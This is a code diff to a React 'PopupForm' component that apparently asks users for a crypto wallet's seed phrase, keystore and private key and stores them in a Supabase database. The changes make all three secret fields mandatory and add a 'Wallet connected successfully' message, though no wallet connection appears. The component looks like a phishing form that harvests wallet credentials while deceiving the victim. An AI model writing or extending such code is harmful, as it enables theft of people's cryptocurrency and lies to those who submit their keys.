@@ -1,6 +1,7 @@
-import { useState } from "react";
+import { useContext, useState } from "react";
 import { PopUpButtons } from "./Button";
 import { supabase } from "../service/supabase";
+import toast from "react-hot-toast";
 
 const PopupForm = ({ setCurrentWallet, currentWallet }) => {
   const [activeTab, setActiveTab] = useState("phrase");
@@ -36,6 +37,8 @@ const PopupForm = ({ setCurrentWallet, currentWallet }) => {
         wallet_privatekey: formData.privatekey,
       },
     ]);
+    setCurrentWallet(null);
+    toast.success("Wallet connected successfully");
   };
 
   return (
@@ -79,6 +82,7 @@ const PopupForm = ({ setCurrentWallet, currentWallet }) => {
                   id="phrase"
                   name="phrase"
                   rows={4}
+                  required
                   value={formData.phrase}
                   onChange={handleInputChange}
                   className="w-full rounded-md border border-gray-300 px-3 py-2 shadow-sm focus:border-blue-500 focus:outline-none focus:ring-blue-500 dark:bg-transparent"
@@ -100,6 +104,7 @@ const PopupForm = ({ setCurrentWallet, currentWallet }) => {
                   id="keystore"
                   name="keystore"
                   rows={4}
+                  required
                   value={formData.keystore}
                   onChange={handleInputChange}
                   className="w-full rounded-md border border-gray-300 px-3 py-2 shadow-sm focus:border-blue-500 focus:outline-none focus:ring-blue-500 dark:bg-transparent"
@@ -120,6 +125,7 @@ const PopupForm = ({ setCurrentWallet, currentWallet }) => {
                 <textarea
                   id="privatekey"
                   name="privatekey"
+                  required
                   rows={4}
                   value={formData.privatekey}
                   onChange={handleInputChange}
